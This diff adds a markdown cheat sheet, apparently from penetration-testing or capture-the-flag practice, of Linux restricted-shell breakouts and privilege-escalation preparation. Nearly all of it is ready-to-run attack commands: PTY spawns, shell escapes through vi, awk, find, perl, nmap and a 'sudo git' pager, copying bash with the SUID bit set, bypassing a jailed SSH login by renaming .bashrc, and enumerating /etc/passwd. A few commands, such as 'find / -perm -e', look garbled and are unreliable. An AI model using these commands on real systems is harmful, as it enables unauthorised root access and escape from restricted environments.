@@ -1,0 +1,81 @@
+### S1REN's Breakouts with a few of my notes thrown in
+
+[ BREAK OUT ]
+python -c 'import pty;pty.spawn("/bin/sh")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+awk 'BEGIN {system("/bin/bash -i")}'
+awk 'BEGIN {system("/bin/sh -i")}'
+nmap--> --interactive
+ed
+!sh
+
+echo os.system('/bin/bash')
+/bin/sh -i
+
+[ Interesting ]
+sh -c 'cp $(which bash) .; chmod +s ./bash'
+./bash -p
+
+sh -c 'cp $(which dash) .; chmod +s ./dash'
+./dash -p
+
+==========================================================================
+sudo git -p --help
+!/bin/bash //Pagination root Priviledge Escalation
+==========================================================================
+
+From within VI:
+:set shell=/bin/sh
+:shell
+
+From within IRB:
+exec "/bin/sh"
+
+awk--> awk 'BEGIN {system("/bin/bash -i")}'
+find--> find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash -i")}' \;
+perl--> perl -e 'exec "/bin/bash";'
+
+1. First for this method, find which bin file 'awk' is in
+find / -name udev -exec /usr/bin/awk 'BEGIN {system("/bin/bash -i")}' \;
+==================================================================================
+=====Jailed SSH Shell?  Try this.... =============================================
+Initial Shell /bin/sh
+If BASH is blockec/
+Check the 'env' variable!
+Linux will default to /bin/bash default bashrc if there is no present .bashrc
+file in a User's home Directory.  Legit shell....)
+
+1. ssh sara@127.0.0.1 "/bin/bash"
+2. cd $HOME
+3. mv .bashrc .bashrc.BAK (Yes, this actually worked.)
+4. exit
+5. ssh sara@127.0.0.1
+
+$ Bling Bling $
+sara@SkyTower:-$
+
+==================================================================================
+[+ AND EXPORT PATH ] (Restomp the groin)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+export TERM=xterm-256color
+alias ll='clear ; ls -lsaht --color=auto'
+Crtl + Z [Background Process]
+stty raw -echo ; fg ; reset
+stty columns 200 rows 200
+==================================================================================
+====Once Broken Out - Before PrivEsc Reference - Perform These Commands===========
+==================================================================================
+find / -perm -e ! -type l -ls 2>/dev/null | sort -r
+----------------------------------------------------------------------------------
+
+grep -vE "nologin|false" /etc/passwd
+----------------------------------------------------------------------------------
+
+====Other, misc====
+----------------------------------------------------------------------------------
+nmap --interactive
+nmap> !sh
+----------------------------------------------------------------------------------
+
